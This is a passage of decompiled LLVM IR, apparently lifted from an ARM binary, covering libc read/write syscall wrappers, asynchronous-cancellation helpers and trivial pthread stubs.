  br i1 %v2_142f8, label %dec_label_pc_14300, label %entry.dec_label_pc_1431c_crit_edge

entry.dec_label_pc_1431c_crit_edge:               ; preds = %entry
  %v3_1431c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1431c

dec_label_pc_14300:                               ; preds = %entry
  %v0_14310 = load i32, i32* @r0, align 4
  %v2_14310 = icmp ugt i32 %v0_14310, -4097
  %v7_14310 = icmp eq i32 %v0_14310, -4096
  store i1 %v7_14310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14310, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1431c, %dec_label_pc_14300
  %merge = phi i32 [ %v0_14310, %dec_label_pc_14300 ], [ %v0_14340, %dec_label_pc_1431c ], [ %v0_14350, %bb10 ], [ %v8_14360, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14300
  %v0_14318 = call i32 @__syscall_error()
  br label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %entry.dec_label_pc_1431c_crit_edge, %bb9
  %v3_1431c = phi i32 [ %v3_1431c.pre, %entry.dec_label_pc_1431c_crit_edge ], [ %v0_14318, %bb9 ]
  store i32 %v3_1431c, i32* %stack_var_-24, align 4
  %v9_1431c = load i32, i32* @r2, align 4
  %v12_1431c = load i32, i32* @r3, align 4
  %v15_1431c = load i32, i32* @r7, align 4
  store i32 %v15_1431c, i32* %stack_var_-8, align 4
  %v18_1431c = load i32, i32* @lr, align 4
  %v0_14320 = call i32 @__libc_enable_asynccancel()
  %v2_14328 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1431c, i32* @r2, align 4
  store i32 %v12_1431c, i32* @r3, align 4
  store i32 %v2_14328, i32* @r7, align 4
  %v1_1433c = call i32 @__libc_disable_asynccancel(i32 %v0_14320)
  %v0_14340 = load i32, i32* @r7, align 4
  store i32 %v0_14340, i32* @r0, align 4
  %v2_14344 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14344, i32* @r7, align 4
  store i32 %v18_1431c, i32* @lr, align 4
  %v2_14348 = icmp ugt i32 %v0_14340, -4097
  %v7_14348 = icmp eq i32 %v0_14340, -4096
  store i1 %v7_14348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14348, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1431c
  %v0_14350 = call i32 @__syscall_error()
  %v0_14360 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14360, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14360 = load i32, i32* @r1, align 4
  %v2_14360 = load i32, i32* @r4, align 4
  %v3_14360 = udiv i32 %v2_14360, 65536
  %v4_14360 = mul i32 %v2_14360, 65536
  %v5_14360 = or i32 %v3_14360, %v4_14360
  %v8_14360 = and i32 %v5_14360, %v1_14360
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14340, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14310, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1431c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_14374 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14374, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14374 = load i32, i32* @r0, align 4
  ret i32 %v2_14374

bb1:                                              ; preds = %entry
  %v0_14378 = call i32 @__syscall_error()
  ret i32 %v0_14378
}

define i32 @__GI___libc_write(i32 %arg1, i64* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14384 = load i32, i32* @global_var_24bf0.532, align 4
  %v2_14388 = icmp eq i32 %v3_14384, 0
  store i1 %v2_14388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14388, label %dec_label_pc_14390, label %entry.dec_label_pc_143ac_crit_edge

entry.dec_label_pc_143ac_crit_edge:               ; preds = %entry
  %v3_143ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_143ac

dec_label_pc_14390:                               ; preds = %entry
  %v0_143a0 = load i32, i32* @r0, align 4
  %v2_143a0 = icmp ugt i32 %v0_143a0, -4097
  %v7_143a0 = icmp eq i32 %v0_143a0, -4096
  store i1 %v7_143a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143a0, label %bb11, label %bb

bb:                                               ; preds = %bb13, %bb12, %dec_label_pc_143ac, %dec_label_pc_14390
  %merge = phi i32 [ %v0_143a0, %dec_label_pc_14390 ], [ %v0_143d0, %dec_label_pc_143ac ], [ %v0_143e0, %bb12 ], [ %v7_143f0, %bb13 ]
  ret i32 %merge

bb11:                                             ; preds = %dec_label_pc_14390
  %v0_143a8 = call i32 @__syscall_error()
  br label %dec_label_pc_143ac

dec_label_pc_143ac:                               ; preds = %entry.dec_label_pc_143ac_crit_edge, %bb11
  %v3_143ac = phi i32 [ %v3_143ac.pre, %entry.dec_label_pc_143ac_crit_edge ], [ %v0_143a8, %bb11 ]
  %v15_143ac = load i32, i32* @r3, align 4
  %v18_143ac = load i32, i32* @r7, align 4
  store i32 %v18_143ac, i32* %stack_var_-8, align 4
  %v21_143ac = load i32, i32* @lr, align 4
  %v0_143b0 = call i32 @__libc_enable_asynccancel()
  store i32 %tmp, i32* @r1, align 4
  store i32 %v15_143ac, i32* @r3, align 4
  store i32 %v3_143ac, i32* @r7, align 4
  %v1_143cc = call i32 @__libc_disable_asynccancel(i32 %v0_143b0)
  %v0_143d0 = load i32, i32* @r7, align 4
  store i32 %v0_143d0, i32* @r0, align 4
  %v2_143d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_143d4, i32* @r7, align 4
  store i32 %v21_143ac, i32* @lr, align 4
  %v2_143d8 = icmp ugt i32 %v0_143d0, -4097
  %v7_143d8 = icmp eq i32 %v0_143d0, -4096
  store i1 %v7_143d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143d8, label %bb12, label %bb

bb12:                                             ; preds = %dec_label_pc_143ac
  %v0_143e0 = call i32 @__syscall_error()
  %v0_143f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_143f0, label %bb13, label %bb

bb13:                                             ; preds = %bb12
  %v1_143f0 = load i32, i32* @r1, align 4
  %v2_143f0 = inttoptr i32 %v1_143f0 to i64*
  %v3_143f0 = load i64, i64* %v2_143f0, align 4
  %v6_143f0 = udiv i64 %v3_143f0, 4294967296
  %v7_143f0 = trunc i64 %v6_143f0 to i32
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_143d0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_143a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_143ac, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14404 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14404, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14404 = load i32, i32* @r0, align 4
  ret i32 %v2_14404

bb1:                                              ; preds = %entry
  %v0_14408 = call i32 @__syscall_error()
  ret i32 %v0_14408

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14414 = load i32, i32* @global_var_24bf0.532, align 4
  %v2_14418 = icmp eq i32 %v3_14414, 0
  br i1 %v2_14418, label %dec_label_pc_14420, label %entry.dec_label_pc_1443c_crit_edge

entry.dec_label_pc_1443c_crit_edge:               ; preds = %entry
  %v3_1443c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1443c

dec_label_pc_14420:                               ; preds = %entry
  %v0_14430 = load i32, i32* @r0, align 4
  %v2_14430 = icmp ugt i32 %v0_14430, -4097
  br i1 %v2_14430, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1443c, %dec_label_pc_14420
  %merge = phi i32 [ %v0_14430, %dec_label_pc_14420 ], [ %v0_14460, %dec_label_pc_1443c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14420
  %v0_14438 = call i32 @__syscall_error()
  br label %dec_label_pc_1443c

dec_label_pc_1443c:                               ; preds = %entry.dec_label_pc_1443c_crit_edge, %bb8
  %v3_1443c = phi i32 [ %v3_1443c.pre, %entry.dec_label_pc_1443c_crit_edge ], [ %v0_14438, %bb8 ]
  %v6_1443c = load i32, i32* @r1, align 4
  %v15_1443c = load i32, i32* @r7, align 4
  store i32 %v15_1443c, i32* %stack_var_-8, align 4
  %v18_1443c = load i32, i32* @lr, align 4
  %v0_14440 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_1443c, i32* @r1, align 4
  store i32 %v3_1443c, i32* @r7, align 4
  %v1_1445c = call i32 @__libc_disable_asynccancel(i32 %v0_14440)
  %v0_14460 = load i32, i32* @r7, align 4
  store i32 %v0_14460, i32* @r0, align 4
  %v2_14464 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14464, i32* @r7, align 4
  store i32 %v18_1443c, i32* @lr, align 4
  %v2_14468 = icmp ugt i32 %v0_14460, -4097
  br i1 %v2_14468, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1443c
  %v0_14470 = call i32 @__syscall_error()
  ret i32 %v0_14470

; uselistorder directives
  uselistorder i32 %v0_14460, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_1443c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14480 = load i32, i32* %r0.global-to-local, align 4
  %v1_14480 = and i32 %v0_14480, 2
  %v2_14480 = icmp eq i32 %v1_14480, 0
  %v3_14484 = load i32, i32* @r4, align 4
  store i32 %v3_14484, i32* %stack_var_-16, align 4
  br i1 %v2_14480, label %dec_label_pc_1448c, label %dec_label_pc_14500

dec_label_pc_1448c:                               ; preds = %entry
  %v0_1448c = call i32 @__aeabi_read_tp()
  store i32 %v0_1448c, i32* %r0.global-to-local, align 4
  %v1_14490 = add i32 %v0_1448c, -1036
  %v2_14490 = inttoptr i32 %v1_14490 to i32*
  %v3_14490 = load i32, i32* %v2_14490, align 4
  %v1_14494 = add i32 %v0_1448c, -1168
  store i32 %v1_14494, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14498

dec_label_pc_14498:                               ; preds = %dec_label_pc_144cc.dec_label_pc_14498_crit_edge, %dec_label_pc_1448c
  %v0_144a4 = phi i32 [ %v0_144a4.pre, %dec_label_pc_144cc.dec_label_pc_14498_crit_edge ], [ %v1_14494, %dec_label_pc_1448c ]
  %v0_14498 = phi i32 [ %v0_144cc, %dec_label_pc_144cc.dec_label_pc_14498_crit_edge ], [ %v3_14490, %dec_label_pc_1448c ]
  %v1_14498 = and i32 %v0_14498, -3
  store i32 %v1_14498, i32* %r7.global-to-local, align 4
  store i32 %v0_14498, i32* %r4.global-to-local, align 4
  store i32 %v1_14498, i32* @r1, align 4
  %v1_144a4 = add i32 %v0_144a4, 132
  store i32 %v1_144a4, i32* @r2, align 4
  %v1_144a823 = inttoptr i32 %v1_144a4 to i32*
  %v2_144a824 = load i32, i32* %v1_144a823, align 4
  %v3_144ac26 = icmp uge i32 %v2_144a824, %v0_14498
  store i1 %v3_144ac26, i1* %cpsr_c.global-to-local, align 1
  %v9_144ac32 = icmp eq i32 %v2_144a824, %v0_14498
  br i1 %v9_144ac32, label %dec_label_pc_144b4, label %dec_label_pc_144cc

dec_label_pc_144b4:                               ; preds = %dec_label_pc_14498, %dec_label_pc_144b4.dec_label_pc_144a8_crit_edge
  %v0_144b433 = phi i32 [ %v1_144ac.pre, %dec_label_pc_144b4.dec_label_pc_144a8_crit_edge ], [ %v0_14498, %dec_label_pc_14498 ]
  store i32 %v0_144b433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_144c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_144c4, label %dec_label_pc_144c8, label %dec_label_pc_144b4.dec_label_pc_144a8_crit_edge

dec_label_pc_144b4.dec_label_pc_144a8_crit_edge:  ; preds = %dec_label_pc_144b4
  %v0_144a8.pre = load i32, i32* @r2, align 4
  %v1_144ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_144a8 = inttoptr i32 %v0_144a8.pre to i32*
  %v2_144a8 = load i32, i32* %v1_144a8, align 4
  %v3_144ac = icmp uge i32 %v2_144a8, %v1_144ac.pre
  store i1 %v3_144ac, i1* %cpsr_c.global-to-local, align 1
  %v9_144ac = icmp eq i32 %v2_144a8, %v1_144ac.pre
  br i1 %v9_144ac, label %dec_label_pc_144b4, label %dec_label_pc_144cc

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144b4
  %v0_144c8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_144cc

dec_label_pc_144cc:                               ; preds = %dec_label_pc_14498, %dec_label_pc_144b4.dec_label_pc_144a8_crit_edge, %dec_label_pc_144c8
  %v0_144cc = phi i32 [ %v0_144c8, %dec_label_pc_144c8 ], [ %v2_144a824, %dec_label_pc_14498 ], [ %v2_144a8, %dec_label_pc_144b4.dec_label_pc_144a8_crit_edge ]
  %v1_144cc = phi i32 [ %v0_144c8, %dec_label_pc_144c8 ], [ %v0_14498, %dec_label_pc_14498 ], [ %v1_144ac.pre, %dec_label_pc_144b4.dec_label_pc_144a8_crit_edge ]
  %v3_144cc = icmp uge i32 %v0_144cc, %v1_144cc
  store i1 %v3_144cc, i1* %cpsr_c.global-to-local, align 1
  %v9_144cc = icmp eq i32 %v0_144cc, %v1_144cc
  br i1 %v9_144cc, label %dec_label_pc_144f4.preheader, label %dec_label_pc_144cc.dec_label_pc_14498_crit_edge

dec_label_pc_144cc.dec_label_pc_14498_crit_edge:  ; preds = %dec_label_pc_144cc
  %v0_144a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14498

dec_label_pc_144f4.preheader:                     ; preds = %dec_label_pc_144cc
  %v0_144f41 = load i32, i32* %r7.global-to-local, align 4
  %v1_144f42 = and i32 %v0_144f41, 12
  store i32 %v1_144f42, i32* @r3, align 4
  %v2_144f83 = icmp ugt i32 %v1_144f42, 3
  store i1 %v2_144f83, i1* %cpsr_c.global-to-local, align 1
  %v7_144f85 = icmp eq i32 %v1_144f42, 4
  br i1 %v7_144f85, label %dec_label_pc_144d8.lr.ph, label %dec_label_pc_144f4.preheader.dec_label_pc_14500.loopexit_crit_edge

dec_label_pc_144f4.preheader.dec_label_pc_14500.loopexit_crit_edge: ; preds = %dec_label_pc_144f4.preheader
  %v1_14504.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14500.loopexit

dec_label_pc_144d8.lr.ph:                         ; preds = %dec_label_pc_144f4.preheader
  %v0_144dc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_144dc = add i32 %v0_144dc.pre, 132
  %v2_144f0 = inttoptr i32 %v1_144dc to i32*
  br label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144d8.lr.ph, %dec_label_pc_144d8
  %v0_144d8 = phi i32 [ %v0_144f41, %dec_label_pc_144d8.lr.ph ], [ %v3_144f0, %dec_label_pc_144d8 ]
  store i32 %v0_144d8, i32* @r2, align 4
  store i32 %v1_144dc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_144f0 = load i32, i32* %v2_144f0, align 4
  store i32 %v3_144f0, i32* %r7.global-to-local, align 4
  %v1_144f4 = and i32 %v3_144f0, 12
  store i32 %v1_144f4, i32* @r3, align 4
  %v7_144f8 = icmp eq i32 %v1_144f4, 4
  br i1 %v7_144f8, label %dec_label_pc_144d8, label %dec_label_pc_144f4.dec_label_pc_14500.loopexit_crit_edge

dec_label_pc_144f4.dec_label_pc_14500.loopexit_crit_edge: ; preds = %dec_label_pc_144d8
  %v2_144f8 = icmp ugt i32 %v1_144f4, 3
  store i1 %v2_144f8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14500.loopexit

dec_label_pc_14500.loopexit:                      ; preds = %dec_label_pc_144f4.preheader.dec_label_pc_14500.loopexit_crit_edge, %dec_label_pc_144f4.dec_label_pc_14500.loopexit_crit_edge
  %v1_14504.pre = phi i32 [ %v1_14504.pre.pre, %dec_label_pc_144f4.preheader.dec_label_pc_14500.loopexit_crit_edge ], [ %v1_144dc, %dec_label_pc_144f4.dec_label_pc_14500.loopexit_crit_edge ]
  %v2_14500.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14500

dec_label_pc_14500:                               ; preds = %dec_label_pc_14500.loopexit, %entry
  %v1_14504 = phi i32 [ %v1_14504.pre, %dec_label_pc_14500.loopexit ], [ %v0_14480, %entry ]
  %v2_14500 = phi i32 [ %v2_14500.pre, %dec_label_pc_14500.loopexit ], [ %v3_14484, %entry ]
  store i32 %v2_14500, i32* @r4, align 4
  ret i32 %v1_14504

; uselistorder directives
  uselistorder i32 %v3_144f0, { 1, 2, 0 }
  uselistorder i32 %v1_144dc, { 0, 2, 1 }
  uselistorder i32 %v0_144c8, { 1, 0 }
  uselistorder i32 %v1_144ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14498, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_14500.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_144d8, { 1, 0 }
  uselistorder label %dec_label_pc_144cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_144b4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14508 = load i32, i32* @r4, align 4
  store i32 %v3_14508, i32* %stack_var_-24, align 4
  store i32 54476, i32* %r8.global-to-local, align 4
  %v0_14510 = call i32 @__aeabi_read_tp()
  %v1_14514 = add i32 %v0_14510, -1036
  %v2_14514 = inttoptr i32 %v1_14514 to i32*
  %v3_14514 = load i32, i32* %v2_14514, align 4
  store i32 %v3_14514, i32* %r6.global-to-local, align 4
  %v1_14518 = add i32 %v0_14510, -1168
  store i32 %v1_14518, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r8.global-to-local, align 4
  %v1_1452046 = or i32 %v3_14514, 2
  store i32 %v1_1452046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1452449 = icmp eq i32 %v1_1452046, %v3_14514
  br i1 %v9_1452449, label %dec_label_pc_145d0, label %dec_label_pc_1452c

dec_label_pc_1452c:                               ; preds = %entry, %bb.dec_label_pc_1452c_crit_edge
  %v0_14530 = phi i32 [ %v0_14530.pre, %bb.dec_label_pc_1452c_crit_edge ], [ %v1_14518, %entry ]
  %v1_1452051 = phi i32 [ %v1_14520, %bb.dec_label_pc_1452c_crit_edge ], [ %v1_1452046, %entry ]
  %v0_1453450 = phi i32 [ %v1_14560, %bb.dec_label_pc_1452c_crit_edge ], [ %v3_14514, %entry ]
  store i32 %v1_1452051, i32* @r1, align 4
  %v1_14530 = add i32 %v0_14530, 132
  store i32 %v1_14530, i32* @r2, align 4
  store i32 %v0_1453450, i32* %r4.global-to-local, align 4
  %v1_1453834 = inttoptr i32 %v1_14530 to i32*
  %v2_1453835 = load i32, i32* %v1_1453834, align 4
  store i32 %v2_1453835, i32* @r3, align 4
  %v3_1453c37 = icmp uge i32 %v2_1453835, %v0_1453450
  store i1 %v3_1453c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1453c43 = icmp eq i32 %v2_1453835, %v0_1453450
  br i1 %v9_1453c43, label %dec_label_pc_14544, label %dec_label_pc_1455c

dec_label_pc_14544:                               ; preds = %dec_label_pc_1452c, %dec_label_pc_14544.dec_label_pc_14538_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14554 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14554, label %dec_label_pc_14558, label %dec_label_pc_14544.dec_label_pc_14538_crit_edge

dec_label_pc_14544.dec_label_pc_14538_crit_edge:  ; preds = %dec_label_pc_14544
  %v0_14538.pre = load i32, i32* @r2, align 4
  %v1_1453c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14538 = inttoptr i32 %v0_14538.pre to i32*
  %v2_14538 = load i32, i32* %v1_14538, align 4
  store i32 %v2_14538, i32* @r3, align 4
  %v3_1453c = icmp uge i32 %v2_14538, %v1_1453c.pre
  store i1 %v3_1453c, i1* %cpsr_c.global-to-local, align 1
  %v9_1453c = icmp eq i32 %v2_14538, %v1_1453c.pre
  br i1 %v9_1453c, label %dec_label_pc_14544, label %dec_label_pc_1455c

dec_label_pc_14558:                               ; preds = %dec_label_pc_14544
  %v0_14558 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14558, i32* @r3, align 4
  br label %dec_label_pc_1455c

dec_label_pc_1455c:                               ; preds = %dec_label_pc_1452c, %dec_label_pc_14544.dec_label_pc_14538_crit_edge, %dec_label_pc_14558
  %v1_14560 = phi i32 [ %v0_14558, %dec_label_pc_14558 ], [ %v2_1453835, %dec_label_pc_1452c ], [ %v2_14538, %dec_label_pc_14544.dec_label_pc_14538_crit_edge ]
  %v1_1455c = load i32, i32* %r6.global-to-local, align 4
  %v3_1455c = icmp uge i32 %v1_14560, %v1_1455c
  store i1 %v3_1455c, i1* %cpsr_c.global-to-local, align 1
  %v9_1455c = icmp eq i32 %v1_14560, %v1_1455c
  br i1 %v9_1455c, label %dec_label_pc_14568, label %bb

bb:                                               ; preds = %dec_label_pc_1455c
  store i32 %v1_14560, i32* %r6.global-to-local, align 4
  %v1_14520 = or i32 %v1_14560, 2
  store i32 %v1_14520, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14524 = icmp eq i32 %v1_14520, %v1_14560
  br i1 %v9_14524, label %dec_label_pc_145d0, label %bb.dec_label_pc_1452c_crit_edge

bb.dec_label_pc_1452c_crit_edge:                  ; preds = %bb
  %v0_14530.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1452c

dec_label_pc_14568:                               ; preds = %dec_label_pc_1455c
  %v0_14568 = load i32, i32* %r5.global-to-local, align 4
  %v1_14568 = and i32 %v0_14568, -69
  store i32 %v1_14568, i32* @r3, align 4
  %v2_1456c = icmp ugt i32 %v1_14568, 9
  store i1 %v2_1456c, i1* %cpsr_c.global-to-local, align 1
  %v7_1456c = icmp eq i32 %v1_14568, 10
  br i1 %v7_1456c, label %dec_label_pc_14574, label %dec_label_pc_145d0

dec_label_pc_14574:                               ; preds = %dec_label_pc_14568
  %v1_14578 = load i32, i32* %r7.global-to-local, align 4
  %v2_14578 = add i32 %v1_14578, 544
  %v3_14578 = inttoptr i32 %v2_14578 to i32*
  store i32 -1, i32* %v3_14578, align 4
  %v0_1457c = load i32, i32* @r2, align 4
  store i32 %v0_1457c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14580

dec_label_pc_14580:                               ; preds = %dec_label_pc_145b4.dec_label_pc_14580_crit_edge, %dec_label_pc_14574
  %v0_14584 = phi i32 [ %v0_14584.pre, %dec_label_pc_145b4.dec_label_pc_14580_crit_edge ], [ %v0_1457c, %dec_label_pc_14574 ]
  %v0_14580 = load i32, i32* %r7.global-to-local, align 4
  %v1_14580 = add i32 %v0_14580, 132
  %v2_14580 = inttoptr i32 %v1_14580 to i32*
  %v3_14580 = load i32, i32* %v2_14580, align 4
  store i32 %v0_14584, i32* @r2, align 4
  store i32 %v3_14580, i32* %r4.global-to-local, align 4
  %v1_1458c = or i32 %v3_14580, 16
  store i32 %v1_1458c, i32* @r1, align 4
  %v1_1459022 = inttoptr i32 %v0_14584 to i32*
  %v2_1459023 = load i32, i32* %v1_1459022, align 4
  %v3_1459425 = icmp uge i32 %v2_1459023, %v3_14580
  store i1 %v3_1459425, i1* %cpsr_c.global-to-local, align 1
  %v9_1459431 = icmp eq i32 %v2_1459023, %v3_14580
  br i1 %v9_1459431, label %dec_label_pc_1459c, label %dec_label_pc_145b4

dec_label_pc_1459c:                               ; preds = %dec_label_pc_14580, %dec_label_pc_1459c.dec_label_pc_14590_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_145ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_145ac, label %dec_label_pc_145b0, label %dec_label_pc_1459c.dec_label_pc_14590_crit_edge

dec_label_pc_1459c.dec_label_pc_14590_crit_edge:  ; preds = %dec_label_pc_1459c
  %v0_14590.pre = load i32, i32* @r2, align 4
  %v1_14594.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14590 = inttoptr i32 %v0_14590.pre to i32*
  %v2_14590 = load i32, i32* %v1_14590, align 4
  %v3_14594 = icmp uge i32 %v2_14590, %v1_14594.pre
  store i1 %v3_14594, i1* %cpsr_c.global-to-local, align 1
  %v9_14594 = icmp eq i32 %v2_14590, %v1_14594.pre
  br i1 %v9_14594, label %dec_label_pc_1459c, label %dec_label_pc_145b4

dec_label_pc_145b0:                               ; preds = %dec_label_pc_1459c
  %v0_145b0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_145b4

dec_label_pc_145b4:                               ; preds = %dec_label_pc_14580, %dec_label_pc_1459c.dec_label_pc_14590_crit_edge, %dec_label_pc_145b0
  %v0_145b4 = phi i32 [ %v0_145b0, %dec_label_pc_145b0 ], [ %v2_1459023, %dec_label_pc_14580 ], [ %v2_14590, %dec_label_pc_1459c.dec_label_pc_14590_crit_edge ]
  %v1_145b4 = phi i32 [ %v0_145b0, %dec_label_pc_145b0 ], [ %v3_14580, %dec_label_pc_14580 ], [ %v1_14594.pre, %dec_label_pc_1459c.dec_label_pc_14590_crit_edge ]
  %v3_145b4 = icmp uge i32 %v0_145b4, %v1_145b4
  store i1 %v3_145b4, i1* %cpsr_c.global-to-local, align 1
  %v9_145b4 = icmp eq i32 %v0_145b4, %v1_145b4
  br i1 %v9_145b4, label %dec_label_pc_145bc, label %dec_label_pc_145b4.dec_label_pc_14580_crit_edge

dec_label_pc_145b4.dec_label_pc_14580_crit_edge:  ; preds = %dec_label_pc_145b4
  %v0_14584.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14580

dec_label_pc_145bc:                               ; preds = %dec_label_pc_145b4
  store i32 116, i32* @r3, align 4
  %v0_145c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_145c4 = add i32 %v0_145c4, 116
  %v3_145c4 = inttoptr i32 %v2_145c4 to i32*
  %v4_145c4 = load i32, i32* %v3_145c4, align 4
  store i32 %v4_145c4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_145c4)
  %v0_145d0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_145d0

dec_label_pc_145d0:                               ; preds = %entry, %bb, %dec_label_pc_14568, %dec_label_pc_145bc
  %v0_145d0 = phi i32 [ %v1_14560, %dec_label_pc_14568 ], [ %v0_145d0.pre, %dec_label_pc_145bc ], [ %v3_14514, %entry ], [ %v1_14560, %bb ]
  %v2_145d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_145d4, i32* @r4, align 4
  ret i32 %v0_145d0

; uselistorder directives
  uselistorder i32 %v0_145b0, { 1, 0 }
  uselistorder i32 %v1_14594.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14520, { 1, 2, 0 }
  uselistorder i32 %v1_1455c, { 1, 0 }
  uselistorder i32 %v1_14560, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1453c.pre, { 1, 0 }
  uselistorder i32 %v0_1453450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_145d0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_145b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1459c, { 1, 0 }
  uselistorder label %dec_label_pc_1455c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14544, { 1, 0 }
  uselistorder label %dec_label_pc_1452c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

